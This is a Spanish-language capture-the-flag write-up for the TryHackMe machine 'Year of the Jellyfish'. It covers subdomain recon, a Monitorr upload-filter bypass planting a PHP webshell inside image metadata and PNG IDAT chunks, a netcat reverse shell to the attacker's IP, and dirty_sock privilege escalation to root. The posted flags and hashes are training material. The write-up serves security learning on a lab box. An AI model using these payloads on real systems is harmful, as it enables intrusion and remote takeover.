Apache/2.4.29 (Ubuntu) Location: https://robyns-petshop.thm/ Content-Type: text/html; charset=iso-8859-1   SSLSCAN Nmap muestra un dominio y subdominios, utilizamos sslscan para verificar estos subdominios.\n1 2 3 4 5 6 7 8 9 10 11 12  ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ sslscan 54.171.187.11|tail -n 10 SSL Certificate: Signature Algorithm: sha256WithRSAEncryption RSA Key Strength: 2048 Subject: robyns-petshop.thm Altnames: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm Issuer: robyns-petshop.thm Not valid before: Apr 27 06:04:33 2021 GMT Not valid after: Apr 27 06:04:33 2022 GMT   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en cada uno de los subdominios y dominio principal, tambien el puerto 8000.\n1 2 3 4 5 6 7 8 9 10 11 12  # gohttp https://robyns-petshop.thm -k /assets (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/assets/] /business (Status: 401) [Size: 466] /config (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/config/] /content (Status: 301) [Size: 328] [--\u0026gt; https://robyns-petshop.thm/content/] /index.php (Status: 200) [Size: 3671] /index.php (Status: 200) [Size: 3671] /LICENSE (Status: 200) [Size: 1085] /plugins (Status: 301) [Size: 328] [--\u0026gt; https://robyns-petshop.thm/plugins/] /server-status (Status: 403) [Size: 284] /themes (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/themes/] /vendor (Status: 301) [Size: 327] [--\u0026gt; https://robyns-petshop.thm/vendor/]   1 2 3 4 5 6 7 8 9 10 11 12  # gohttp https://monitorr.robyns-petshop.thm -k /assets (Status: 301) [Size: 345] [--\u0026gt; https://monitorr.robyns-petshop.thm/assets/] /changelog.html (Status: 200) [Size: 4655] /data (Status: 301) [Size: 343] [--\u0026gt; https://monitorr.robyns-petshop.thm/data/] /favicon.ico (Status: 200) [Size: 41160] /index.php (Status: 200) [Size: 14974] /index.php (Status: 200) [Size: 14974] /LICENSE.txt (Status: 200) [Size: 1086] /robots.txt (Status: 200) [Size: 87] /robots.txt (Status: 200) [Size: 87] /server-status (Status: 403) [Size: 293] /settings.php (Status: 200) [Size: 16335]   1 2  # curl -s https://beta.robyns-petshop.thm/ -k \u0026lt;html lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Under Development!\u0026lt;/title\u0026gt;\u0026lt;meta charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;meta name=\\\u0026#34;viewport\\\u0026#34; content=\\\u0026#34;width=device-width, initial-scale=1.0\\\u0026#34;\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Under Construction\u0026lt;/h1\u0026gt;\u0026lt;h2\u0026gt;This site is under development. Please be patient.\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. beta.robyns-petshop.thm/ID_HERE)\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12  # gohttp https://dev.robyns-petshop.thm -k /assets (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/assets/] /business (Status: 401) [Size: 470] /config (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/config/] /content (Status: 301) [Size: 336] [--\u0026gt; https://dev.robyns-petshop.thm/content/] /index.php (Status: 200) [Size: 3703] /index.php (Status: 200) [Size: 3703] /LICENSE (Status: 200) [Size: 1085] /plugins (Status: 301) [Size: 336] [--\u0026gt; https://dev.robyns-petshop.thm/plugins/] /server-status (Status: 403) [Size: 288] /themes (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/themes/] /vendor (Status: 301) [Size: 335] [--\u0026gt; https://dev.robyns-petshop.thm/vendor/]   SUBDOMINIOS  robyns-petshop.thm: encontramos lo que parece ser CMS pico. monitorr.robyns-petshop.thm: vemos Monitorr en su version 1.7.6m, además en el dashboard vemos PetShop que redirige al puerto 80 en localhost y Jellyfin al puerto 8096. beta.robyns-petshop.thm: al parecer es un sitio en \u0026ldquo;construccion\u0026rdquo;. dev.robyns-petshop.thm: aparentemente es la misma pagina que está en el dominio principal. PUERTO 8096: en este puerto encontramos el login de Jellyfin.  SEARCHSPLOIT Realizamos una busqueda de exploits o vulnerabilidades para Pico, Monitorr y Jellyfin. Encontramos una vulnerabilidad de tipo LFI y RFI para Pico aunque ninguna de estas afecta a la version de la maquina. Para Monitorr encontramos dos exploits, uno para realizar bypass al CMS y crear una cuenta de administrador, el segundo para ejecucion de comandos mediante un archivo en PHP.\n1 2 3 4 5 6  ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- Monitorr 1.7.6m - Authorization Bypass | php/webapps/48981.py Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) | php/webapps/48980.py ----------------------------------------------------------------------------- ---------------------------------   MONITORR - RCE Monitorr es de codigo abierto por lo que descargamos la version 1.7.6m para analizar el codigo fuente. El primer exploit Monitorr 1.7.6m - Authorization Bypass crea una cuenta a por medio de _register.php aunque no existe tal archivo y/o direccion. En cuanto al RCE encontramos que la direccion existe.\n1 2 3  ╭─kali@kali ~/thm/jellyfish ╰─➤ curl -s \u0026#34;https://monitorr.robyns-petshop.thm/assets/php/upload.php\u0026#34; -k \u0026lt;div id=\u0026#39;uploadreturn\u0026#39;\u0026gt;You are an exploit.\u0026lt;/div\u0026gt;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;ERROR: ../data/usrimg/ already exists.\u0026lt;/div\u0026gt;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;ERROR: was not uploaded.\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;   Al realizar la ejecucion del exploit este nos muestra un error ya que la pagina es HTTPS, aunque al modificar el exploit y ejecutarlo, este no logra subir el archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ python 48980.py https://monitorr.robyns-petshop.thm 10.2.30.132 1338 /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;monitorr.robyns-petshop.thm\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings A shell script should be uploaded. Now we try to execute it /usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;monitorr.robyns-petshop.thm\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ curl -s \u0026#34;https://monitorr.robyns-petshop.thm/assets/data/usrimg/\u0026#34; -k | html2text ****** Index of /assets/data/usrimg ****** [[ICO]] Name Last_modified Size Description =========================================================================== [[PARENTDIR]] Parent_Directory - [[IMG]] usrimg.png 2021-04-11 00:07 5.3K =========================================================================== Apache/2.4.29 (Ubuntu) Server at monitorr.robyns-petshop.thm Port 443   UPLOAD.PHP El archivo upload.php es el que obtiene la imagen y mediante getimagesize() verifica si es una imagen y que tipo, si lo es, sube el archivo, en caso contrario no, por lo que de alguna forma debemos de realizar bypass al \u0026ldquo;filtro\u0026rdquo; realizando cambios a una imagen.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  \u0026lt;?php $target_dir = \u0026#34;../data/usrimg/\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION)); $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]); $rawfile = $_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]; echo \u0026#34;\u0026lt;div id=\u0026#39;uploadreturn\u0026#39;\u0026gt;\u0026#34;; if($check !== false) { echo \u0026#34;File \u0026#34; . $rawfile . \u0026#34; is an image: \u0026#34; . $check[\u0026#34;mime\u0026#34;] ; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;ERROR: \u0026#34; . $rawfile . \u0026#34; is not an image or exceeds the webserver’s upload size limit.\u0026#34;; echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; $uploadOk = 0; } [... REDACTED ...]   BYPASS - WEB-SHELL UPLOAD Creamos un archivo html para realizar la subida de archivos hacia upload.php, capturamos la solicitud en burpsuite para modificar los diferentes parametros de solicitud para realizar bypass utilizando Burpsuite.\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://monitorr.robyns-petshop.thm/assets/php/upload.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; Select image to upload: \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;fileToUpload\u0026#34; id=\u0026#34;fileToUpload\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload Image\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Al cambiar la extension de una imagen vemos un ERROR.\nNota:\nSe muestran dos metodos ya que por alguna razon no funcionó dos veces el mismo \u0026ldquo;metodo\u0026rdquo; al iniciar diferentes instancias de la maquina.\nCOMMENT - 1 Agregamos codigo php para ejecucion de comandos en los metadatos de una imagen como en Networked - HTB pero no funcionó al intentar cambiar de extension manualmente, aunque la imagen .JPG si subió.\n1 2  exiftool -Comment=\u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; batman.jpg cp batman.jpg batman.jpg.php   Creamos un wordlist a partir de las diferentes extensiones presentadas en HackTricks para usarlas en Intruder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  # extensiones .php2 .php3 .php4 .php5 .php6 .php7 .phps .phps .pht .phtm .phtml .pgif .shtml .htaccess .phar .inc .pHp5 .Php5 .pHp5 .phpJunk123png .pHp5 .php%00 .php\\x00 .php%0a .php%0d%0a .php .php%00.png%00.jpg .pphphp .php%00.gif .pHp .pHP5 .PhAr   Agregamos dos marcadores junto a la extension JPG, tambien desactivamos la opcion de codificacion de los payloads ya que el wordlist contiene caracteres para agregar null bytes.\nTras realizar el ataque logramos subir la misma imagen con diferentes extensiones.\nAunque solo dos de ellas (.pHp, .phar) funcionaron.\nIDAT CHUNKS PNG - 2 Encontramos una pagina la cual genera una imagen insertando \u0026ldquo;codigo\u0026rdquo; dentro del IDAT CHUNKS de una imagen PNG, aunque solamente permite utilizar mayusculas y es muy limitado al generar nuestro payload, aunque es posible capturar la solicitud y cambiar el codigo en burpsuite. De igual forma existe una herramienta - XSS2PNG con la cual es posible crear imagenes con este mismo \u0026ldquo;metodo\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ┌──(kali㉿kali)-[~/thm/jellyfish/tmp] └─$ python3 xss2png.py -p \u0026#34;\u0026lt;?php echo system(\\$_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; -o cmd.png ____ __ _____ ___|___ \\ _ __ _ __ __ _ \\ \\/ / __/ __| __) | \u0026#39;_ \\| \u0026#39;_ \\ / _` | \u0026gt; \u0026lt;\\__ \\__ \\/ __/| |_) | | | | (_| | /_/\\_\\___/___/_____| .__/|_| |_|\\__, | |_| |___/ PNG IDAT chunks XSS payload generator [i] Using payload: \u0026lt;?PHP ECHO SYSTEM($_GET[\u0026#39;CMD\u0026#39;]); ?\u0026gt; [i] Generating final PNG output [!] PNG output saved as: cmd.png ┌──(kali㉿kali)-[~/thm/jellyfish/tmp] └─$ xxd cmd.png 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0020 0000 0020 0802 0000 00fc 18ed ... ... ........ 00000020: a300 0000 6e49 4441 5478 9c63 fc3c 3f50 ....nIDATx.c.\u0026lt;?P 00000030: 4850 2045 4348 4f20 5359 5354 454d 2824 HP ECHO SYSTEM($ 00000040: 5f47 4554 5b27 434d 4427 5d29 3b20 3f3e _GET[\u0026#39;CMD\u0026#39;]); ?\u0026gt; 00000050: 20e0 96c4 ad19 079f cbfd f876 f349 d023 ..........v.I.# 00000060: eeab 9f98 9e6b 7af1 3d39 cdf6 cbf2 dfd3 .....kz.=9...... 00000070: 070e 8cfa 9cbe 3c2c 1cbe a919 8c0c a360 ......\u0026lt;,.......` 00000080: 148c 8251 300a 46c1 2818 05a3 6014 8c82 ...Q0.F.(...`... 00000090: a10b 00ee a01d 02f0 116e 5900 0000 0049 .........nY....I 000000a0: 454e 44ae 4260 82 END.B`. .   De la misma manera cambiamos la extension esta vez a phar, al ejecutar comandos utilizar el parametro en mayuscula (CMD).\n1 2 3 4 5 6 7 8  ┌──(kali㉿kali)-[~/thm/jellyfish/tmp] └─$ curl -s \u0026#34;https://monitorr.robyns-petshop.thm/assets/data/usrimg/z.png.phar?CMD=id\u0026#34; -k -o /dev/shm/o \u0026amp;\u0026amp; cat /dev/shm/o PNG IHDR nIDATxcuid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) vI#kz=9\u0026lt;, `Q0 F(`   SHELL - WWW-DATA Intentamos ejecutar diferentes shell inversas en diferentes lenguajes utilizando la webshell, pero nunca se ejecutó alguna, tambien intentamos utilizar ngrok ya que en la descripcion de la maquina mencionaba que la IP era publica \u0026ldquo;Be warned \u0026ndash; this box deploys with a public IP\u0026hellip;\u0026quot; aunque no funcionó.\nDB \u0026amp; FLAG1 En el directorio /var/www/monitorr encontramos la base de datos de monitorr que contiene una contraseña la cual no logramos crackear, además encontramos nuestra primera flag: flag1.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # cmd=ls -lah ../../../ sqlite\u0026gt; .open datausers.db sqlite\u0026gt; .tables users sqlite\u0026gt; .schema users CREATE TABLE `users` ( `user_id` INTEGER PRIMARY KEY, `user_name` varchar(64), `user_password_hash` varchar(255), `user_email` varchar(64)); sqlite\u0026gt; select * from users; 1|admin|$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa| sqlite\u0026gt; # cmd=ls -lah ../../../../; cat ../../../../flag1.txt total 24K drwxr-xr-x 5 root root 4.0K Apr 11 23:11 . drwxr-xr-x 14 root root 4.0K Apr 9 23:45 .. drwxr-xr-x 9 root root 4.0K Apr 11 17:00 dev -r-------- 1 www-data www-data 38 Apr 11 23:11 flag1.txt drwxr-xr-x 9 root root 4.0K Apr 11 14:38 html drwxr-xr-x 4 www-data www-data 4.0K Apr 11 14:24 monitorr THM{YjljMDYyZWUxYmQwMTkxYjNlMDY4YmY5}   APACHE *.CONF Tambien dentro de los archivos de configuracion de apache vemos una \u0026ldquo;contraseña\u0026rdquo; encriptada relacionada al subdominio dev.* y que segun parece pertenece a robyn aunque no logramos crackear esta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # cmd=ls -lah /etc/apache2/sites-av*; cat /etc/apache2/sites-av*/dev*;cat /etc/apache2/htpasswd total 24K drwxr-xr-x 2 root root 4.0K Apr 17 21:38 . drwxr-xr-x 8 root root 4.0K Apr 11 14:43 .. -rw-r--r-- 1 root root 670 Apr 17 21:38 000-default.conf -rw-r--r-- 1 root root 451 Apr 17 21:38 beta.conf -rw-r--r-- 1 root root 608 Apr 17 21:38 dev.conf -rw-r--r-- 1 root root 457 Apr 17 21:38 monitorr.conf \u0026lt;VirtualHost *:80\u0026gt; ServerName dev.robyns-petshop.thm Redirect / https://dev.robyns-petshop.thm/ \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:443\u0026gt; ServerName dev.robyns-petshop.thm ServerAdmin webmaster@localhost DocumentRoot /var/www/dev \u0026lt;Directory \u0026#34;/var/www/dev/business\u0026#34;\u0026gt; AuthType Basic AuthName \u0026#34;Business Credentials Please\u0026#34; AuthUserFile \u0026#34;/etc/apache2/htpasswd\u0026#34; Require valid-user \u0026lt;/Directory\u0026gt; SSLCertificateFile /etc/ssl/certs/webserver.crt SSLCertificateKeyFile /etc/ssl/private/webserver.key ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; robyn:$apr1$tMFlj08b$5VCOhI2see0L0WRU8Mn.b.   LINPEAS Realizamos una enumeracion utilizando linpeas.sh lo que permitio obtener informacion inportante:\n Netcat está en la maquina aunque esta como netcat y no nc como la mayoria de comandos para shell inversa que utilizan netcat. Vemos que existen sockets que son ejecutados por root en este caso snapd. Existe reglas en iptables las cuales permiten \u0026ldquo;comunicacion\u0026rdquo; unicamente a los puertos 443,80 desde fuera-hacia-adentro y viceversa (INPUT-OUTPUT), por lo que podriamos utilizar uno de estos puertos para obtener una shell. El puerto SSH es el 22222.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  [+] Useful software /bin/netcat [... REDACTED ...] [+] HTTP sockets [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets Socket /run/snapd.socket owned by root uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;sync\u0026#34;,\u0026#34;status-code\u0026#34;:200,\u0026#34;status\u0026#34;:\u0026#34;OK\u0026#34;,\u0026#34;result\u0026#34;:[\u0026#34;TBD\u0026#34;]} Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;status-code\u0026#34;:401,\u0026#34;status\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;message\u0026#34;:\u0026#34;access denied\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;login-required\u0026#34;}} [... REDACTED ...] [+] Iptables rules *filter :INPUT DROP [0:0] :FORWARD ACCEPT [0:0] :OUTPUT DROP [6:1044] -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m multiport --dports 21,80,443,22,22222,8000,8096 -j ACCEPT -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT [... REDACTED ...] [+] Searching ssl/ssh files Port 22222 ChallengeResponseAuthentication no --\u0026gt; /etc/hosts.allow file found, read the rules: /etc/hosts.allow [... REDACTED ...]   SHELL Con la informacion anterior modificamos los comandos para shell inversa que utilizan nc a netcat y hacia el puerto 80, unicamente funcionó con Netcat OpenBsd.\n1 2 3 4 5 6  # Netcat OpenBsd # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|netcat 10.2.30.132 80 \u0026gt;/tmp/f # BURPSUITE GET /assets/data/usrimg/idat.png.phar?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|netcat 10.2.30.132 80 \u0026gt;/tmp/f HTTP/1.1 # BURPSUITE \u0026gt;\u0026gt; CTRL + U -\u0026gt; REV SHELL GET /assets/data/usrimg/idat.png.phar?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|netcat+10.2.30.132+80+\u0026gt;/tmp/f HTTP/1.1   \u0026hellip; logramos obtener acceso a la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ sudo rlwrap nc -lvvp 80 listening on [any] 80 ... connect to [10.2.30.132] from 10.10.143.206 [10.10.143.206] 42558 /bin/sh: 0: can\u0026#39;t access tty; job control turned off which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami;id;pwd whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/monitorr/assets/data/usrimg www-data@petshop:/var/www/monitorr/assets/data/usrimg$   PRIVILEGE ESCALATION Se mencionó en LINPEAS que se encontraron sockets (/run/snapd.socket, /run/snapd-snap.socket) que son \u0026ldquo;ejecutados\u0026rdquo; y dueño de root, por lo que investigamos sobre estos, encontramos exploits (1,2) que están relacionados a la vulnerabilidad dirty_sock de la API de snapd. Verificamos la version de snap y vemos que esta en el \u0026ldquo;rango\u0026rdquo; de versiones afectadas.\n1 2 3 4 5 6 7 8  www-data@petshop:/$ snap version snap version snap 2.32.5+18.04 snapd 2.32.5+18.04 series 16 ubuntu 18.04 kernel 4.15.0-140-generic www-data@petshop:/$   La maquina tiene acceso a internet por lo que descargamos el exploit de dirty_sockv2 para no crear una cuenta en ubuntu y que la explotacion sea sin depender de una cuenta (0xdf - Playing with Dirty Sock). Utilizando este exploit logramos obtener acceso root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  www-data@petshop:/dev/shm$ python3 dirty_02.py ___ _ ____ ___ _ _ ____ ____ ____ _ _ | \\ | |__/ | \\_/ [__ | | | |_/ |__/ | | \\  | | ___ ___] |__| |___ | \\_ (version 2) //=========[]==========================================\\\\ || R\u0026amp;D || initstring (@init_string) || || Source || https://github.com/initstring/dirty_sock || || Details || https://initblog.com/2019/dirty-sock || \\\\=========[]==========================================// [+] Slipped dirty sock on random socket file: /tmp/vlwffnkrbg;uid=0; [+] Binding to socket file... [+] Connecting to snapd API... [+] Deleting trojan snap (and sleeping 5 seconds)... [+] Installing the trojan snap (and sleeping 8 seconds)... [+] Deleting trojan snap (and sleeping 5 seconds)... ******************** Success! You can now `su` to the following account and use sudo: username: dirty_sock password: dirty_sock ******************** www-data@petshop:/dev/shm$ su dirty_sock Password: dirty_sock To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. dirty_sock@petshop:/dev/shm$ whoami; id dirty_sock uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo) dirty_sock@petshop:/dev/shm$ cd /root bash: cd: /root: Permission denied dirty_sock@petshop:/dev/shm$ sudo su Password: dirty_sock root@petshop:/dev/shm# cd /root root@petshop:~# ls -lah total 24K drwx------ 3 root root 4.0K Apr 29 08:52 . drwxr-xr-x 23 root root 4.0K Apr 9 23:56 .. lrwxrwxrwx 1 root root 9 Apr 10 23:09 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Apr 9 2018 .bashrc -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-------- 1 root root 38 Apr 11 23:12 root.txt drwxr-xr-x 3 root root 4.0K Apr 29 08:52 snap root@petshop:~# cat root.txt THM{ZWM5N2ViY2QxNjE4MjkxOWRiYWQ4NjUx} root@petshop:~#   ANEXO SSH HONEYPOT Mientrar realizabamos una enumeracion con la webshell encontramos que el puerto 22 es un honeypot.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # cmd=ls -lah /opt/ssh-honeypot total 76K drwxr-xr-x 7 root root 4.0K Apr 11 02:07 . drwxr-xr-x 4 root root 4.0K Apr 16 19:31 .. drwxr-xr-x 8 root root 4.0K Apr 11 02:03 .git -rw-r--r-- 1 root root 69 Apr 11 02:03 .gitignore -rw-r--r-- 1 root root 190 Apr 11 02:03 CHANGELOG.md -rw-r--r-- 1 root root 255 Apr 11 02:03 INSTALL.md -rw-r--r-- 1 root root 1.1K Apr 11 02:03 LICENSE.md -rw-r--r-- 1 root root 625 Apr 11 02:05 Makefile -rw-r--r-- 1 root root 312 Apr 11 02:03 MakefileOSX -rw-r--r-- 1 root root 2.1K Apr 11 02:03 README.md -rw-r--r-- 1 root root 49 Apr 11 02:03 TODO.md drwxr-xr-x 2 root root 4.0K Apr 11 02:05 bin drwxr-xr-x 3 root root 4.0K Apr 11 02:03 docker drwxr-xr-x 2 root root 4.0K Apr 11 02:03 scripts drwxr-xr-x 2 root root 4.0K Apr 11 02:03 src -rw-r--r-- 1 root root 95 Apr 11 02:06 ssh-honeypot.log -rw------- 1 root root 1.7K Apr 11 02:05 ssh-honeypot.rsa -rw-r--r-- 1 root root 394 Apr 11 02:05 ssh-honeypot.rsa.pub -rw-r--r-- 1 root root 357 Apr 11 02:07 ssh-honeypot.service # cmd=ps -ef | grep ssh-honeypot nobody 915 1 0 04:24 ? 00:00:00 /opt/ssh-honeypot/bin/ssh-honeypot -p 22 -r /opt/ssh-honeypot/ssh-honeypot.rsa -u nobody -l /var/log/ssh-honeypot.log -f /var/run/ssh-honeypot.pid -d nobody 19715 915 0 07:22 ? 00:00:00 /opt/ssh-honeypot/bin/ssh-honeypot -p 22 -r /opt/ssh-honeypot/ssh-honeypot.rsa -u nobody -l /var/log/ssh-honeypot.log -f /var/run/ssh-honeypot.pid -d www-data 19717 18702 0 07:22 ? 00:00:00 sh -c ps -ef | grep ssh-honeypot www-data 19719 19717 0 07:22 ? 00:00:00 grep ssh-honeypot   UPLOAD.PHP MODIFICADO Encontramos tambien el archivo upload.php el cual fue modificado y no aceptaba archivos con extension .php, además debia enviarse la cookie isHuman=1 sin esto el archivo no era aceptado lo cual no tomamos en cuenta en el exploit y la extension de la imagen :(.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  \u0026lt;?php $allowedExts = [\u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;, \u0026#34;gif\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;bmp\u0026#34;]; $target_dir = \u0026#34;../data/usrimg/\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION)); $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]) \u0026amp;\u0026amp; !strstr($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;], \u0026#34;php\u0026#34;) \u0026amp;\u0026amp; in_array(explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;])[1], $allowedExts); $rawfile = $_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]; echo \u0026#34;\u0026lt;div id=\u0026#39;uploadreturn\u0026#39;\u0026gt;\u0026#34;; if ($_COOKIE[\u0026#34;isHuman\u0026#34;] != true){ echo \u0026#34;You are an exploit.\u0026#34;; echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; $uploadOk = 0; } else if($check !== false) { echo \u0026#34;File \u0026#34; . $rawfile . \u0026#34; is an image: \u0026#34; . $check[\u0026#34;mime\u0026#34;] ; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;ERROR: \u0026#34; . $rawfile . \u0026#34; is not an image or exceeds the webserver’s upload size limit.\u0026#34;; echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; $uploadOk = 0; }   Aunque burpsuite si lo tomo en cuenta.\n","description":"Year of the Jellyfish es una maquina de TryHackMe, descubrimos dominios y subdominios con SSLSCAN lo que nos permitio encontrar una vulnerabilidad en Monitorr, se muestran dos formas para realizar bypass al filtro de ficheros lo que permitio obtener acceso. Finalmente ejecutamos Linpeas lo que nos guió una vulnerabilidad en snapd la cual explotamos para obtener acceso privilegiado.","id":12,"section":"posts","tags":["monitorr 1.7.6m","sslscan","webshell","metadata","exiftool","idat chunks","xss2png","linpeas","dirty_sock"],"title":"TryHackMe - Year of the Jellyfish","uri":"https://sckull.github.io/posts/jellyfish/"},{"content":"  Bucket es una maquina de HackTheBox, encontramos un S3 con mala configuracion de autenticacion donde subimos una shell inversa en PHP. Encontramos DynamoDB localmente con credenciales para realizar movimiento lateral. Para la escalada de privilegios aprovechamos que Pd4Cmd genera PDFs con informacion de DynamoDB, en este ultimo 